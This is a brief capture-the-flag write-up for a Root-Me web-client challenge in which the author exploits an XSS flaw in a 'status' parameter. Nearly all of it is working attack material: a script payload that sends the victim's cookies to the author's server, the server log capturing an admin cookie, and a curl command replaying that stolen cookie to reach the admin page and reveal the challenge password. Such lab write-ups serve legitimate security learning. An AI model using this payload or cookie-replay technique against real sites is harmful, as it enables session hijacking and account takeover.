In this challenge, we can exploit a reflected XSS vulnerability through the **status** variable, which is both reflected and stored. By intercepting the request in Burp Suite, we can modify this variable to inject our payload.

The following payload sends a request to my server, exfiltrating the victim's cookies:
```
invite"><script>document.location='https://my-server?c='+document.cookie</script>
```

Response:
```
127.0.0.1 - - [24/Feb/2025 23:28:32] "GET /?c=status=invite;%20ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F HTTP/1.1" 200 -
```
```bash
┌─[nguyenlong05@sw1mj3llyf1sh] - [~] - [Mon Feb 24, 23:33]
└─[$] <> curl 'http://challenge01.root-me.org/web-client/ch19/?section=admin' -H "Cookie: status=invite; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F" | grep pass
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1345    0  1345    0     0   2740      0 --:--:-- --:--:-- --:--:--  2744
	<h3>Vous pouvez valider ce challenge avec ce mot de passe / You can validate challenge with this pass : E5HKEGyCXQVsYaehaqeJs0AfV
```